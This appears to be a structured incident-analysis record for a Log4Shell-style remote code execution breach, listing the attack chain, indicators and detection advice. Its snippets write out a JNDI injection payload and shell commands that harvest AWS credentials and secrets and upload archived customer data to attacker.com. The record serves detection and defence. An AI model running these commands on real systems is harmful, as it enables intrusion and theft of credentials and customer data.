package_info.package_versions: Known, high-severity vulnerable version (e.g., pre-patch Log4j)
package_info.why_malicious: The package contains a critical, well-documented remote code execution vulnerability that was not patched. Attackers exploited this flaw to inject and execute arbitrary code, access sensitive files and environment variables, and exfiltrate confidential data. The presence of this unremediated vulnerability in production systems directly enabled a catastrophic data breach.

execution_context.file_location: core application code (via vulnerable open source framework)

malicious_snippets.code_snippet: Attacker sends a specially crafted payload to the application, exploiting the vulnerable framework (e.g., Log4Shell: ${jndi:ldap://attacker.com/a})
malicious_snippets.code_language: varies (Java for Log4j, could be others)
malicious_snippets.code_behavior: At runtime, the application processes attacker-controlled input, which triggers the vulnerable framework to perform a remote JNDI lookup, resulting in remote code execution and enabling the attacker to run arbitrary commands, access environment variables, and exfiltrate sensitive data.

malice_analysis.why_suspicious: The code path allows untrusted user input to be interpreted as executable instructions, specifically enabling remote JNDI lookups that result in arbitrary code execution and data exfiltration.
malice_analysis.violated_expectations: Secure frameworks must never allow user input to trigger code execution or access sensitive data. This behavior is a direct violation of secure coding and input validation practices.
malice_analysis.similar_legitimate_use: JNDI lookups or dynamic code execution may be used in legitimate enterprise applications, but only with trusted, sanitized input and never with untrusted user data.
key_indicators: Processing of attacker-controlled input as code (e.g., JNDI lookup patterns like ${jndi:ldap://...})
Unexpected network requests to attacker-controlled domains during input processing
Access to sensitive environment variables and files as a result of input handling

malicious_snippets.code_snippet: Attacker uses remote shell to enumerate and exfiltrate files: e.g., cat /etc/passwd; tar czf /tmp/data.tar.gz /customer_data; curl -F 'file=@/tmp/data.tar.gz' https://attacker.com/upload
malicious_snippets.code_behavior: At runtime, after achieving code execution, the attacker enumerates sensitive files, archives customer data into a compressed file, and transfers the archive to an external server via an outbound HTTP POST request.

malice_analysis.why_suspicious: Unusual file access and outbound network connections to untrusted domains, especially involving archiving and transferring sensitive data, are strong indicators of compromise.
malice_analysis.violated_expectations: Normal application behavior should not include arbitrary file reads, creation of compressed archives of sensitive data, or outbound data transfers to unknown servers.
malice_analysis.similar_legitimate_use: Backup or migration scripts may archive and transfer data, but only to trusted, internal destinations and under controlled circumstances.
key_indicators: Access to sensitive files or directories (e.g., /customer_data, /etc/passwd)
Creation of temporary archive files in system directories (e.g., /tmp/data.tar.gz)
Outbound HTTP(S) POST requests with file uploads to external, non-corporate domains
Use of command-line tools (cat, tar, curl) for data exfiltration

malicious_snippets.code_snippet: Attacker enumerates credentials: e.g., cat ~/.aws/credentials; env | grep SECRET; curl -d 'creds=...' https://attacker.com/creds
malicious_snippets.code_behavior: At runtime, after gaining code execution, the attacker searches for credentials in environment variables and configuration files, then exfiltrates the harvested credentials to an external server using an HTTP POST request.

malice_analysis.why_suspicious: Harvesting credentials from environment variables and configuration files, followed by exfiltration to external infrastructure, is a hallmark of post-exploitation activity.
malice_analysis.violated_expectations: Applications should never transmit internal credentials or secrets to untrusted destinations, nor should they enumerate sensitive environment variables or credential files outside of secure, internal processes.
malice_analysis.similar_legitimate_use: Automated deployment tools may access credentials, but only for internal use and never transmit them externally.
key_indicators: Enumeration of environment variables for secrets (e.g., env | grep SECRET)
Outbound HTTP(S) requests containing credential data to attacker-controlled infrastructure

attack_chain.action: Attacker sends a crafted payload exploiting the vulnerable open source framework, achieving remote code execution.
attack_chain.leads_to: Attacker gains initial access to the environment.

attack_chain.action: Attacker uses remote shell to enumerate and archive sensitive customer data.
Attacker exfiltrates archived data and harvested credentials to external infrastructure.
attack_chain.leads_to: Data breach and compromise of customer information.

behavioral_signatures: Processing of attacker-controlled input as code (e.g., JNDI lookups, eval, exec) during input handling
Unexpected outbound network connections from application servers following suspicious input patterns
Access to sensitive files or environment variables at runtime outside of normal application logic
Creation and transfer of large data archives to external destinations using command-line tools
file_indicators: Creation of temporary archive files in system directories (e.g., /tmp/data.tar.gz)
network_indicators: Outbound connections to untrusted or attacker-controlled domains/IPs (e.g., attacker.com)
HTTP(S) POST requests containing large payloads or credential data to external endpoints
detection_knowledge.how_to_detect: Monitor application logs for evidence of remote code execution via vulnerable components, such as JNDI lookup patterns in input fields. Alert on outbound network connections to unknown or untrusted domains, especially following suspicious input or code execution events. Detect unusual file access or archiving activity, particularly involving sensitive data directories or credential files. Correlate credential access and exfiltration attempts with network activity to external endpoints to identify data breaches in progress.
